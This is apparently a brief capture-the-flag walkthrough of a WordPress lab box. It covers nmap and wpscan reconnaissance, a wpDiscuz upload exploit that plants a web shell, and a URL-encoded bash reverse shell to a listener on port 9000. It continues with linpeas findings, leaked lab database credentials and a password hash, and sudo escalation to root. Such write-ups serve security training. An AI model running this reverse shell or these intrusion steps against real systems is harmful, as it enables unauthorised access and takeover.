Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-22 10:02 +0000
Nmap scan report for 192.168.60.217
Host is up (0.00031s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds


http://192.168.60.217/assets/fonts/blog/

wpscan --url "http://192.168.60.217/assets/fonts/blog/" --enumerate p,u --plugins-detection aggressive

[+] wpdiscuz
 | Location: http://192.168.60.217/assets/fonts/blog/wp-content/plugins/wpdiscuz/
 | Last Updated: 2026-04-10T14:31:00.000Z
 | Readme: http://192.168.60.217/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
 | [!] The version is out of date, the latest version is 7.6.54
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.60.217/assets/fonts/blog/wp-content/plugins/wpdiscuz/, status: 200
 |
 | Version: 7.0.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.60.217/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt

[i] User(s) Identified:

[+] jm3s
searchsploit exploit
<img width="871" height="347" alt="image" src="https://github.com/user-attachments/assets/4dfaa691-7154-4d37-b9ed-0434ce8baf7a" />

edit /etc/hosts because it keeps redirecting to blogger.pg
<img width="568" height="146" alt="image" src="https://github.com/user-attachments/assets/10e752a6-96fd-424e-abf7-12171de348c0" />

reverse shell uploaded
<img width="797" height="267" alt="image" src="https://github.com/user-attachments/assets/bb056920-7a3a-48c4-bfa1-b75d5f54f481" />

using ?cmd=id i can run commands
<img width="780" height="134" alt="image" src="https://github.com/user-attachments/assets/b9be6041-339b-4c43-a8de-aeed70df9104" />

encode this bash script and put in the url. has to be wrapped in bash -c '.....' because it will treat & as a special character
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.60%2F9000%200%3E%261%27
<img width="489" height="130" alt="image" src="https://github.com/user-attachments/assets/7c8d6a9d-ba7d-466d-b80b-155bba017ad1" />

local
<img width="662" height="126" alt="image" src="https://github.com/user-attachments/assets/efd6d6b6-14ec-47a8-9b7f-90f7992d6b15" />

linpeas
/run/acpid.socket                                                                                         
  ??(Read Write (Weak Permissions: 666) )
  ??(Owned by root)
  ??High risk: root-owned and writable Unix socket
/run/dbus/system_bus_socket
  ??(Read Write (Weak Permissions: 666) )
  ??(Owned by root)
  ??High risk: root-owned and writable Unix socket
/run/mysqld/mysqld.sock
  ??(Read Write Execute (Weak Permissions: 777) )
/run/snapd-snap.socket
  ??(Read Write (Weak Permissions: 666) )
  ??(Owned by root)
  ??High risk: root-owned and writable Unix socket
/run/snapd.socket
  ??(Read Write (Weak Permissions: 666) )
  ??(Owned by root)
  ??High risk: root-owned and writable Unix socket
/run/systemd/cgroups-agent
/run/systemd/journal/dev-log
  ??(Read Write (Weak Permissions: 666) )
  ??(Owned by root)
  ??High risk: root-owned and writable Unix socket
/run/systemd/journal/socket
  ??(Read Write (Weak Permissions: 666) )
  ??(Owned by root)
  ??High risk: root-owned and writable Unix socket
/run/systemd/journal/stdout
  ??(Read Write (Weak Permissions: 666) )
  ??(Owned by root)
  ??High risk: root-owned and writable Unix socket
/run/systemd/journal/syslog
  ??(Read Write (Weak Permissions: 666) )
  ??(Owned by root)
  ??High risk: root-owned and writable Unix socket
/run/systemd/notify
  ??(Read Write Execute (Weak Permissions: 777) )
  ??(Owned by root)
  ??High risk: root-owned and writable Unix socket
/run/systemd/private
  ??(Read Write Execute (Weak Permissions: 777) )
  ??(Owned by root)
  ??High risk: root-owned and writable Unix socket
/run/udev/control
/run/uuidd/request
  ??(Read Write (Weak Permissions: 666) )
  ??(Owned by root)
  ??High risk: root-owned and writable Unix socket
/run/vmware/guestServicePipe
  ??(Read Write (Weak Permissions: 666) )
  ??(Owned by root)
  ??High risk: root-owned and writable Unix socket
/var/lib/lxd/unix.socket
/var/run/dbus/system_bus_socket
  ??(Read Write (Weak Permissions: 666) )
  ??(Owned by root)
  ??High risk: root-owned and writable Unix socket
/var/run/mysqld/mysqld.sock
  ??(Read Write Execute (Weak Permissions: 777) )
/var/run/vmware/guestServicePipe
  ??(Read Write (Weak Permissions: 666) )
  ??(Owned by root)
  ??High risk: root-owned and writable Unix socket

Potentially vulnerable to CVE-2021-4034 (PwnKit) - check distro patches


wpconfig
** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'sup3r_s3cr3t');

<img width="870" height="213" alt="image" src="https://github.com/user-attachments/assets/2287a613-90de-47b3-8653-cb006831987c" />
rabbithole
j@m3s      | $P$BqG2S/yf1TNEu03lHunJLawBEzKQZv/ | jm3s          | admin@blogger.thm

su into vagrant using password vagrant
<img width="467" height="100" alt="image" src="https://github.com/user-attachments/assets/3fe52a2d-19b2-4603-832b-7dd59bbb512a" />

sudo -l got permission for everything, gtfo bins sudo /bin/sh

<img width="793" height="305" alt="image" src="https://github.com/user-attachments/assets/41eb9034-9553-4ec7-9596-19648064d1d7" />




